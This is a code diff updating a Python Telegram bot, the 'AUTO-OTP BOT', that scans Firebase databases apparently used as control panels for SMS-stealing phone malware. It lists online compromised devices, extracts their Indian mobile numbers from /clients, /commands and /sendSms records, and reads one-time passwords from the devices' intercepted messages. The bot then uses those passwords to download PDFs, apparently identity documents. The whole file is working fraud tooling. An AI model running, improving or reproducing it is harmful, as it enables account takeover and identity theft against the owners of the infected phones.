@@ -1,6 +1,6 @@
 """
 ╔══════════════════════════════════════════════════╗
-║          AUTO-OTP BOT v1.5                       ║
+║          AUTO-OTP BOT v1.6                       ║
 ║   Firebase → Auto Number → Auto OTP → PDF Drop   ║
 ╚══════════════════════════════════════════════════╝
 
@@ -12,7 +12,7 @@ Commands:
   /listfire               - List all added Firebase DBs with status
   /scan                   - Scan all DBs and show online devices
   /debugscan              - Deep debug scan (clients + top-level keys)
-  /debugusers             - Deep inspect user/phone paths
+  /debugusers             - Inspect user/phone paths
   /debugmsgs <deviceId>   - Show last messages for one device
   /auto [count]           - Start auto-OTP for N numbers (default 5)
   /stopauto               - Stop running auto-OTP
@@ -296,116 +296,113 @@ def dl_pdf(eid,otp,otxn,tid):
         return False,f'HTTP {r.status_code}'
     except Exception as e: return False,str(e)
 
-# ============== FIREBASE ==============
-PHONE_FIELDS = [
-    "mobNo","phoneNumber","phone","mobno","mobile","number",
-    "mobile_no","mobileNo","mob","sim","sim1","sim2",
-    "contact","msisdn","phone_no","PhoneNumber","Phone","Mobile",
-    "mobile_number","phone_number","user_mobile","user_phone"
-]
-
-def _is_online(dd):
-    for key in ["status","online","isOnline","active","is_active","connected"]:
-        if key in dd:
-            v = dd[key]
-            if v is True or v == 1: return True
-            if isinstance(v, str) and v.strip().lower() in ("true","1","online","on","active","yes","connected"):
-                return True
-    return False
-
-def _extract_phone(dd):
-    sources = [dd]
-    for sub in ("info","data","device","user","profile"):
-        if isinstance(dd.get(sub), dict):
-            sources.append(dd[sub])
-    for src in sources:
-        for f in PHONE_FIELDS:
-            v = src.get(f)
-            if v and str(v).strip() and str(v) not in ["?","None","null",""]:
-                return str(v).strip()
+# ============== FIREBASE — PHONE HELPERS ==============
+def _looks_like_phone(s):
+    """Return normalized 10-digit Indian mobile or None."""
+    if not s: return None
+    d = re.sub(r'[^0-9]', '', str(s))
+    if len(d) == 12 and d.startswith('91'): d = d[2:]
+    if len(d) == 11 and d.startswith('0'): d = d[1:]
+    if len(d) == 10 and re.match(r'^[6-9]\d{9}$', d): return d
     return None
 
-def fb_fetch_users(url, auth):
-    """Try to load a phone-bearing node."""
-    for path in ["users","user_data","All_User","All_Users","registeredDevices","Verify_Device","devices"]:
-        try:
-            r = requests.get(f"{url}/{path}.json?auth={auth}", timeout=10)
-            if r.status_code == 200:
-                j = r.json()
-                if isinstance(j, dict) and j:
-                    # Heuristic: does it contain a phone-like value?
-                    for k, v in list(j.items())[:5]:
-                        if isinstance(v, dict):
-                            for fk, fv in v.items():
-                                kl = fk.lower()
-                                if any(x in kl for x in ['phone','mob','number','sim','msisdn']):
-                                    if str(fv).strip():
-                                        return path, j
-                        # Or key itself is a phone
-                        if re.match(r'^\d{10,}$', str(k)):
-                            return path, j
-        except: continue
-    return None, {}
+
+def _phone_from_any(obj, depth=0):
+    """Recursively look for a phone-looking value under known keys."""
+    if depth > 3 or not isinstance(obj, dict): return None
+    # Direct keys first (order matters — `to` first because that's what your DB uses)
+    for k in ("to","number","phone","phoneNumber","mobNo","mobile","num",
+              "msisdn","contact","user","recipient","target","destination"):
+        if k in obj:
+            p = _looks_like_phone(obj[k])
+            if p: return p
+    # Nested one level
+    for k in ("commands","sendSms","send_sms","sms","smsCommand",
+              "webhookEvent","action","command","data","info"):
+        if k in obj and isinstance(obj[k], dict):
+            p = _phone_from_any(obj[k], depth+1)
+            if p: return p
+    return None
+
+
+def _is_online(dd):
+    st = dd.get("status") if isinstance(dd, dict) else None
+    if st is True or st == 1: return True
+    if isinstance(st, str) and st.strip().lower() in ("true","1","online","on","active","yes","connected"):
+        return True
+    return False
+
 
 def fb_scan():
     devs = []
     with firebase_lock: dbs = list(firebase_dbs)
+
     for db in dbs:
         url = db['url'].rstrip('/'); auth = db['auth']
 
-        # Load clients
-        clients = {}
+        # 1) Load /clients (online status)
         try:
-            r = requests.get(f"{url}/clients.json?auth={auth}", timeout=10)
-            if r.status_code == 200 and isinstance(r.json(), dict):
-                clients = r.json()
-        except: continue
-        if not clients: continue
+            r = requests.get(f"{url}/clients.json?auth={auth}", timeout=12)
+            clients = r.json() if r.status_code == 200 else None
+        except: clients = None
+        if not isinstance(clients, dict) or not clients: continue
 
-        # Load users (phone map)
-        upath, users = fb_fetch_users(url, auth)
-        logger.info(f"[SCAN] {url.split('//')[-1][:40]} users_path={upath} users={len(users)}")
+        # 2) Load /commands (device_id -> phone via .commands.to)
+        try:
+            r = requests.get(f"{url}/commands.json?auth={auth}", timeout=12)
+            commands = r.json() if r.status_code == 200 else {}
+        except: commands = {}
+        if not isinstance(commands, dict): commands = {}
+
+        # 3) Load /sendSms as fallback
+        try:
+            r = requests.get(f"{url}/sendSms.json?auth={auth}", timeout=12)
+            sendsms = r.json() if r.status_code == 200 else {}
+        except: sendsms = {}
+        if not isinstance(sendsms, dict): sendsms = {}
+
+        logger.info(f"[SCAN] {url.split('//')[-1][:40]} clients={len(clients)} commands={len(commands)} sendSms={len(sendsms)}")
 
         for did, dd in clients.items():
             if not isinstance(dd, dict): continue
             if not _is_online(dd): continue
 
-            ph = _extract_phone(dd)  # maybe phone is in clients after all
+            # -------- phone lookup chain --------
+            ph = None
 
-            if not ph and isinstance(users, dict):
-                # Case A: users keyed by deviceId
-                u = users.get(did)
-                if isinstance(u, dict):
-                    ph = _extract_phone(u)
-                # Case B: users keyed by phone → find key whose value.deviceId == did
-                if not ph:
-                    for k, v in users.items():
-                        if isinstance(v, dict):
-                            if str(v.get("deviceId","")).strip() == did or str(v.get("device_id","")).strip() == did:
-                                if re.match(r'^\d{10,}$', str(k).strip()):
-                                    ph = str(k).strip()
-                                else:
-                                    ph = _extract_phone(v)
-                                break
+            # (a) directly in the client record
+            ph = _phone_from_any(dd)
 
-            if not ph: continue
-            dg = re.sub(r'[^0-9]','',str(ph))
-            if len(dg) >= 10:
-                cl = dg[-10:]
-                if re.match(r'^[6-9]\d{9}$', cl):
-                    with used_lock:
-                        if cl not in used_numbers:
-                            devs.append({
-                                "db_url": url, "db_auth": auth,
-                                "dev_id": did, "phone": cl, "phone_display": str(ph).strip(),
-                                "battery": str(dd.get("battery","?"))[:6]
-                            })
+            # (b) in /commands[did]
+            if not ph and did in commands:
+                ph = _phone_from_any(commands[did])
+
+            # (c) in /sendSms[did]
+            if not ph and did in sendsms:
+                ph = _phone_from_any(sendsms[did])
+
+            if not ph:
+                logger.info(f"[SCAN] no phone for {did}")
+                continue
+
+            with used_lock:
+                if ph not in used_numbers:
+                    devs.append({
+                        "db_url": url, "db_auth": auth,
+                        "dev_id": did, "phone": ph, "phone_display": ph,
+                        "battery": str(dd.get("battery","?"))[:6]
+                    })
+
     return devs
 
+
 def fb_msgids(url,auth,did):
-    r = requests.get(f"{url}/messages/{did}.json?auth={auth}&shallow=true", timeout=8)
-    if r.status_code == 200 and r.json(): return set(r.json().keys())
+    try:
+        r = requests.get(f"{url}/messages/{did}.json?auth={auth}&shallow=true", timeout=8)
+        if r.status_code == 200 and r.json(): return set(r.json().keys())
+    except: pass
     return set()
+
 
 def fb_otp(url,auth,did,existing,timeout=120):
     t0=time.time()
@@ -557,7 +554,7 @@ def handle(cid, text):
             f"📱 <b>Auto-OTP:</b>\n"
             f"  /scan — Online devices\n"
             f"  /debugscan — Inspect /clients + top keys\n"
-            f"  /debugusers — Inspect /users & phone paths\n"
+            f"  /debugusers — Inspect user/phone paths\n"
             f"  /debugmsgs <code>&lt;deviceId&gt;</code> — Show messages\n"
             f"  /auto [N] — Process N numbers\n"
             f"  /stopauto\n"
@@ -727,17 +724,16 @@ def handle(cid, text):
             send_msg(cid, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n✗ No DBs added.")
             return
 
-        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths (v2)</b>"]
+        report = [f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>🔎 User Paths (v3)</b>"]
 
         for db in dbs[:1]:
             url = db['url'].rstrip('/'); auth = db['auth']
             report.append(f"\n<b>DB:</b> <code>{url.split('//')[-1][:45]}</code>")
-            report.append(f"◈ auth: <code>{auth}</code>")
 
             for path in ["users","user_data","All_User","All_Users",
                          "registeredDevices","Verify_Device","devices",
                          "panel","bot_users","bookings","profex_incoming",
-                         "callForwarding","settings"]:
+                         "callForwarding","settings","commands","sendSms"]:
                 try:
                     r = requests.get(f"{url}/{path}.json?auth={auth}", timeout=12)
                     code = r.status_code
@@ -763,20 +759,18 @@ def handle(cid, text):
                             v = j[k]
                             report.append(f"  {i}. key=<code>{str(k)[:26]}</code>")
                             if isinstance(v, dict):
-                                flds = list(v.keys())[:10]
+                                flds = list(v.keys())[:12]
                                 report.append(f"     fields: {', '.join(flds)}")
-                                for fk in flds:
-                                    fv = v.get(fk)
-                                    kl = fk.lower()
-                                    if any(x in kl for x in ['phone','mob','num','sim','msisdn',
-                                                             'contact','name','eid','uid']):
-                                        report.append(f"     ↳ {fk} = <code>{str(fv)[:45]}</code>")
+                                # Look inside nested commands/sendSms for phone
+                                for sub in flds:
+                                    if isinstance(v.get(sub), dict):
+                                        for sk, sv in list(v[sub].items())[:5]:
+                                            if any(x in sk.lower() for x in ['to','phone','mob','num','number']):
+                                                report.append(f"     ↳ {sub}.{sk} = <code>{str(sv)[:30]}</code>")
                             else:
                                 report.append(f"     value: <code>{str(v)[:60]}</code>")
                     elif isinstance(j, list):
                         report.append(f"  list[{len(j)}]")
-                        if j and isinstance(j[0], dict):
-                            report.append(f"  item[0] keys: {', '.join(list(j[0].keys())[:10])}")
 
                 except Exception as e:
                     report.append(f"◈ /{path} err: {str(e)[:80]}")
